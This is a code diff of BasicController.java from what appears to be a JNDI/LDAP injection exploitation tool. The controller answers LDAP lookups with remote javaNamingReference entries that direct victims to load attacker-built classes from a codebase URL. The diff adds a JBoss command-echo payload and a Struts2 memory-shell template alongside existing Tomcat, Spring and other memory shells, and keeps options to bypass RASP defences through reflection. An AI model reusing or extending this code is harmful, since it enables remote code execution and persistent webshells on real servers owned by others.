@@ -12,12 +12,14 @@ import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
+import com.nu1r.jndi.template.jboss.JbossEcho;
 import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
 import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.resin.RFMSFromThreadF;
 import com.nu1r.jndi.template.resin.RSMSFromThreadS;
 import com.nu1r.jndi.template.spring.SpringControllerMS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
+import com.nu1r.jndi.template.struts2.Struts2ActionMS;
 import com.nu1r.jndi.template.tomcat.*;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
@@ -49,7 +51,7 @@ public class BasicController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with basic remote reference payload|@"));
+            System.out.println(ansi().render("@|green [+]|@Sending LDAP ResourceRef result for" + base + " with basic remote reference payload"));
             Entry     e         = new Entry(base);
             String    className = "";
             CtClass   ctClass;
@@ -143,8 +145,8 @@ public class BasicController implements LdapController {
                                 newClass.makeClassInitializer().insertBefore(className);
 
                                 if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                                    Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                                    CtClass superClass = pool.get(abstTranslet.getName());
+                                    Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                                    CtClass superClass   = pool.get(abstTranslet.getName());
                                     newClass.setSuperclass(superClass);
                                 }
 
@@ -187,8 +189,8 @@ public class BasicController implements LdapController {
                                 newClass.makeClassInitializer().insertBefore(className);
 
                                 if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                                    Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                                    CtClass superClass = pool.get(abstTranslet.getName());
+                                    Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                                    CtClass superClass   = pool.get(abstTranslet.getName());
                                     newClass.setSuperclass(superClass);
                                 }
 
@@ -198,8 +200,8 @@ public class BasicController implements LdapController {
                         }
                     }
                     if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                        CtClass superClass = pool.get(abstTranslet.getName());
+                        Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                        CtClass superClass   = pool.get(abstTranslet.getName());
                         ctClass.setSuperclass(superClass);
                     }
                     className = ctClass.getName();
@@ -242,8 +244,8 @@ public class BasicController implements LdapController {
                                 newClass.makeClassInitializer().insertBefore(className);
 
                                 if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                                    Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                                    CtClass superClass = pool.get(abstTranslet.getName());
+                                    Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                                    CtClass superClass   = pool.get(abstTranslet.getName());
                                     newClass.setSuperclass(superClass);
                                 }
 
@@ -255,10 +257,13 @@ public class BasicController implements LdapController {
                     className = ctClass.getName();
                     ctClass.writeFile();
                     break;
+                case jbossecho:
+                    className = JbossEcho.class.getName();
+                    break;
             }
 
             URL turl = new URL(new URL(this.codebase), className + ".class");
-            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP reference result for |@" + base + " @|MAGENTA redirecting to |@" + turl));
+            System.out.println(ansi().render("@|green [+]|@ Send LDAP reference result for " + base + " redirecting to" + turl));
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaCodeBase", this.codebase);
             e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
@@ -276,7 +281,7 @@ public class BasicController implements LdapController {
     }
 
     public static void main(String[] args) {
-        System.out.println(ansi().fgRgb(188,232,105).render(" Windows下使用Agent写入"));
+        System.out.println(ansi().fgRgb(188, 232, 105).render(" Windows下使用Agent写入"));
     }
 
     @Override
@@ -288,7 +293,7 @@ public class BasicController implements LdapController {
 
             try {
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PaylaodType >> |@" + payloadType));
+                System.out.println(ansi().render("@|green [+]|@PaylaodType >> " + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -333,17 +338,17 @@ public class BasicController implements LdapController {
 
                 if (cmdLine.hasOption("winAgent")) {
                     winAgent = true;
-                    System.out.println(ansi().fgRgb(188,232,105).render("[+] Windows下使用Agent写入"));
+                    System.out.println(ansi().fgRgb(188, 232, 105).render("[+] Windows下使用Agent写入"));
                 }
 
                 if (cmdLine.hasOption("linAgent")) {
                     winAgent = true;
-                    System.out.println(ansi().fgRgb(188,232,105).render("[+] Linux下使用Agent写入"));
+                    System.out.println(ansi().fgRgb(188, 232, 105).render("[+] Linux下使用Agent写入"));
                 }
 
                 if (cmdLine.hasOption("obscure")) {
                     IS_OBSCURE = true;
-                    System.out.println(ansi().fgRgb(188,232,105).render("[+] 使用反射绕过RASP"));
+                    System.out.println(ansi().fgRgb(188, 232, 105).render("[+] 使用反射绕过RASP"));
                 }
 
                 if (cmdLine.hasOption("url")) {
@@ -361,8 +366,8 @@ public class BasicController implements LdapController {
                 }
 
                 if (cmdLine.hasOption("referer")) {
-                    REFERER = cmdLine.getOptionValue("referer");
-                    System.out.println("[+] referer：" + REFERER);
+                    HEADER_KEY = cmdLine.getOptionValue("referer");
+                    System.out.println("[+] referer：" + HEADER_KEY);
                 }
 
                 if (cmdLine.hasOption("AbstractTranslet")) {
@@ -381,7 +386,7 @@ public class BasicController implements LdapController {
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+                System.out.println(ansi().render("@|green [+]|@ Command >> " + cmd));
                 params = new String[]{cmd};
             }
         } catch (Exception e) {
